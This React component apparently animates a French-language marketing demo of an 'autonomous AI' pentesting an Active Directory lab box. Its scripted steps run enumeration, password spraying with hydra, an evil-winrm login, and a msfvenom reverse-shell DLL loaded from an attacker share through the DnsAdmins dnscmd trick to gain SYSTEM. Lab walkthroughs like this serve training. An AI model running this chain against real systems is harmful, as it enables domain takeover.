import { useState, useEffect, useRef } from "react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Play, Pause, RotateCcw, Terminal as TerminalIcon } from "lucide-react";

interface PentestStep {
  thought_process: string;
  input: string;
  output: string;
}

const pentestSteps: PentestStep[] = [
  {
    thought_process: "Premi√®re √©tape : reconnaissance. Scan nmap pour identifier les ports ouverts et services.",
    input: "nmap --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.169",
    output: "Starting Nmap 7.80 ( https://nmap.org )\nNmap scan report for 10.10.10.169\nHost is up (0.24s latency)\nPORT      STATE SERVICE      VERSION\n53/tcp    open  domain?\n88/tcp    open  kerberos-sec Microsoft Windows Kerberos\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open  ldap         Microsoft Windows Active Directory LDAP\n445/tcp   open  microsoft-ds Windows Server 2016\n5985/tcp  open  wsman        Microsoft HTTPAPI httpd 2.0"
  },
  {
    thought_process: "LDAP est ouvert. √ânum√©ration des contextes Active Directory avec ldapsearch.",
    input: "ldapsearch -h 10.10.10.169 -x -s base namingcontexts",
    output: "# extended LDIF\ndn:\nnamingContexts: DC=megabank,DC=local\nnamingContexts: CN=Configuration,DC=megabank,DC=local\nnamingContexts: CN=Schema,CN=Configuration,DC=megabank,DC=local\n\nsearch: 2\nresult: 0 Success"
  },
  {
    thought_process: "√ânum√©ration des utilisateurs du domaine via RPC.",
    input: "rpcclient -U '' 10.10.10.169\nenumdomusers",
    output: "user:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[ryan] rid:[0x451]\nuser:[marko] rid:[0x457]\nuser:[melanie] rid:[0x2775]\nuser:[zach] rid:[0x2776]\nuser:[simon] rid:[0x2777]"
  },
  {
    thought_process: "Recherche de m√©tadonn√©es utilisateur avec enum4linux.",
    input: "enum4linux 10.10.10.169",
    output: "index: 0x10a9 RID: 0x457 acb: 0x00000210\nAccount: marko\nName: Marko Novak\nDesc: Account created. Password set to Welcome123!\n\n[‚úì] Mot de passe trouv√© dans la description !"
  },
  {
    thought_process: "Password spraying avec le mot de passe trouv√© contre tous les utilisateurs.",
    input: "hydra -L users.txt -p Welcome123! smb://10.10.10.169",
    output: "Hydra v9.0 starting...\n[DATA] attacking smb://10.10.10.169:445/\n[STATUS] 4.00 tries/min, 4 tries in 02m01s\n[445][smb] host: 10.10.10.169\n[‚úì] login: melanie password: Welcome123!\n\n[SUCCESS] Identifiants valides trouv√©s !"
  },
  {
    thought_process: "Connexion WinRM avec les identifiants de melanie.",
    input: "evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!",
    output: "Evil-WinRM shell v2.3\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\melanie\\Documents>\n\n[‚úì] Shell obtenu en tant que melanie"
  },
  {
    thought_process: "√ânum√©ration post-compromission. Exploration du syst√®me de fichiers.",
    input: "dir -Force C:\\",
    output: "Directory: C:\\\n\nMode          LastWriteTime Length Name\nd-----         1/3/2020 12:44 AM      PSTranscripts\nd-r---        1/12/2020  7:38 PM      Users\nd-----        1/12/2020  7:40 PM      Windows\n\n[!] R√©pertoire PSTranscripts suspect d√©tect√©"
  },
  {
    thought_process: "Analyse des transcriptions PowerShell pour trouver des identifiants.",
    input: "get-content C:\\PSTranscripts\\20191203\\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt",
    output: "Windows PowerShell transcript start\nUsername: MEGABANK\\ryan\nHost Application: net use X: \\\\fs01\\backups ryan Serv3r4Admin4cc123!\n\n[‚úì] Identifiants de 'ryan' trouv√©s en clair !"
  },
  {
    thought_process: "Connexion avec le compte ryan et v√©rification des privil√®ges.",
    input: "whoami /groups",
    output: "GROUP INFORMATION\n\nGroup Name                           Type\nBUILTIN\\Users                        Alias\nBUILTIN\\DnsAdmins                    Alias\nBUILTIN\\Administrators               Alias (deny only)\n\n[!] Membre du groupe DnsAdmins - Escalade possible !"
  },
  {
    thought_process: "Cr√©ation d'une DLL malveillante avec reverse shell.",
    input: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.23 LPORT=1234 -f dll > plugin.dll",
    output: "[-] No arch selected, selecting arch: x64\nPayload size: 460 bytes\nFinal size of dll file: 8192 bytes\nSaved as: plugin.dll\n\n[‚úì] Payload g√©n√©r√©"
  },
  {
    thought_process: "Configuration du serveur DNS pour charger la DLL malveillante.",
    input: "dnscmd resolute /config /serverlevelplugindll \\\\10.10.14.23\\exploit\\plugin.dll",
    output: "Registry property serverlevelplugindll successfully created.\nCommand completed successfully.\n\n[‚úì] Configuration DNS modifi√©e"
  },
  {
    thought_process: "Red√©marrage du service DNS pour d√©clencher le payload.",
    input: "sc.exe \\\\resolute stop dns && sc.exe \\\\resolute start dns",
    output: "SERVICE_NAME: dns\nSTATE      : 3  STOP_PENDING\nSTATE      : 2  START_PENDING\n\n[‚úì] Service DNS red√©marr√©"
  },
  {
    thought_process: "V√©rification du shell SYSTEM re√ßu.",
    input: "whoami",
    output: "nt authority\\system\n\n[‚úì‚úì‚úì] ACC√àS SYST√àME COMPLET OBTENU !\n\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n  EXPLOITATION R√âUSSIE\n  Vuln√©rabilit√©s d√©couvertes :\n  ‚Ä¢ Mot de passe en clair dans description\n  ‚Ä¢ Credentials dans transcription PS\n  ‚Ä¢ Escalade via DnsAdmins\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê"
  }
];

const PentestTerminal = () => {
  const [isRunning, setIsRunning] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [displayedText, setDisplayedText] = useState("");
  const [phase, setPhase] = useState<"thought" | "input" | "output">("thought");
  const terminalRef = useRef<HTMLDivElement>(null);
  const [history, setHistory] = useState<Array<{ type: string; content: string }>>([]);

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [history, displayedText]);

  useEffect(() => {
    if (!isRunning || currentStep >= pentestSteps.length) {
      if (currentStep >= pentestSteps.length) {
        setIsRunning(false);
      }
      return;
    }

    const step = pentestSteps[currentStep];
    let content = "";
    
    switch (phase) {
      case "thought":
        content = step.thought_process;
        break;
      case "input":
        content = step.input;
        break;
      case "output":
        content = step.output;
        break;
    }

    let charIndex = 0;
    const speed = phase === "output" ? 5 : 20;

    const interval = setInterval(() => {
      if (charIndex < content.length) {
        setDisplayedText(content.slice(0, charIndex + 1));
        charIndex++;
      } else {
        clearInterval(interval);
        
        setHistory(prev => [...prev, { type: phase, content }]);
        setDisplayedText("");

        if (phase === "thought") {
          setTimeout(() => setPhase("input"), 300);
        } else if (phase === "input") {
          setTimeout(() => setPhase("output"), 300);
        } else {
          setTimeout(() => {
            setPhase("thought");
            setCurrentStep(prev => prev + 1);
          }, 500);
        }
      }
    }, speed);

    return () => clearInterval(interval);
  }, [isRunning, currentStep, phase]);

  const handleStart = () => {
    if (currentStep >= pentestSteps.length) {
      handleReset();
    }
    setIsRunning(true);
  };

  const handlePause = () => {
    setIsRunning(false);
  };

  const handleReset = () => {
    setIsRunning(false);
    setCurrentStep(0);
    setPhase("thought");
    setDisplayedText("");
    setHistory([]);
  };

  return (
    <div className="space-y-6">
      {!isRunning && currentStep === 0 && history.length === 0 && (
        <div className="text-center space-y-6 py-8 px-4 bg-gradient-to-b from-primary/5 to-transparent rounded-lg border border-primary/20">
          <div className="space-y-3">
            <div className="inline-flex items-center gap-2 px-4 py-2 bg-primary/10 rounded-full border border-primary/20">
              <div className="w-2 h-2 bg-primary rounded-full animate-pulse"></div>
              <span className="text-sm font-medium text-primary">IA Autonome Pr√™te</span>
            </div>
            <h3 className="text-2xl font-bold">
              Observez notre IA en <span className="text-gradient">Action</span>
            </h3>
            <p className="text-muted-foreground max-w-xl mx-auto">
              D√©couvrez comment notre syst√®me autonome analyse, exploite et s√©curise un environnement Active Directory en temps r√©el.
            </p>
          </div>
          
          <Button
            size="lg"
            variant="hero"
            onClick={handleStart}
            className="h-14 px-8 text-lg animate-[pulse_50s_ease-in-out_infinite] hover:animate-none"
          >
            <Play className="w-5 h-5 mr-2" />
            Lancer la D√©monstration
          </Button>
          
          <p className="text-sm text-muted-foreground">
            ‚ö° Dur√©e: ~2 minutes ‚Ä¢ üéØ Sc√©nario r√©el de pentest
          </p>
        </div>
      )}

      <Card className="bg-card border-primary/20 overflow-hidden">
        <div className="bg-secondary/50 border-b border-primary/20 px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <TerminalIcon className="w-5 h-5 text-primary" />
            <span className="font-mono text-sm font-semibold">fleuret.ai - Pentest Autonome</span>
          </div>
          <div className="flex items-center gap-2">
            {(isRunning || currentStep > 0) && (
              <>
                <Button
                  size="sm"
                  variant="ghost"
                  onClick={isRunning ? handlePause : handleStart}
                  className="h-8 px-3"
                >
                  {isRunning ? (
                    <>
                      <Pause className="w-4 h-4 mr-1" />
                      Pause
                    </>
                  ) : (
                    <>
                      <Play className="w-4 h-4 mr-1" />
                      {currentStep >= pentestSteps.length ? "Rejouer" : "Reprendre"}
                    </>
                  )}
                </Button>
                <Button
                  size="sm"
                  variant="ghost"
                  onClick={handleReset}
                  className="h-8 px-3"
                >
                  <RotateCcw className="w-4 h-4 mr-1" />
                  R√©initialiser
                </Button>
              </>
            )}
          </div>
        </div>

        <div 
          ref={terminalRef}
          className="bg-background/50 p-6 font-mono text-sm h-[600px] overflow-y-auto space-y-4"
        >
          {history.map((item, index) => (
            <div key={index} className="space-y-2">
              {item.type === "thought" && (
                <div className="text-muted-foreground italic">
                  # {item.content}
                </div>
              )}
              {item.type === "input" && (
                <div className="text-primary font-semibold">
                  <span className="text-accent">fleuret@pentest</span>
                  <span className="text-muted-foreground">:</span>
                  <span className="text-primary-glow">~</span>
                  <span className="text-muted-foreground">$ </span>
                  {item.content}
                </div>
              )}
              {item.type === "output" && (
                <pre className="text-foreground/90 whitespace-pre-wrap leading-relaxed">
                  {item.content}
                </pre>
              )}
            </div>
          ))}

          {displayedText && (
            <div className="space-y-2">
              {phase === "thought" && (
                <div className="text-muted-foreground italic">
                  # {displayedText}
                  <span className="animate-pulse">‚ñä</span>
                </div>
              )}
              {phase === "input" && (
                <div className="text-primary font-semibold">
                  <span className="text-accent">fleuret@pentest</span>
                  <span className="text-muted-foreground">:</span>
                  <span className="text-primary-glow">~</span>
                  <span className="text-muted-foreground">$ </span>
                  {displayedText}
                  <span className="animate-pulse">‚ñä</span>
                </div>
              )}
              {phase === "output" && (
                <pre className="text-foreground/90 whitespace-pre-wrap leading-relaxed">
                  {displayedText}
                  <span className="animate-pulse">‚ñä</span>
                </pre>
              )}
            </div>
          )}

          {!isRunning && currentStep === 0 && history.length === 0 && (
            <div className="text-center text-muted-foreground py-12">
              <TerminalIcon className="w-12 h-12 mx-auto mb-4 text-primary/50" />
              <p className="text-lg mb-2">Terminal pr√™t</p>
              <p className="text-sm">Lancez la d√©monstration pour commencer</p>
            </div>
          )}
        </div>
      </Card>
    </div>
  );
};

export default PentestTerminal;
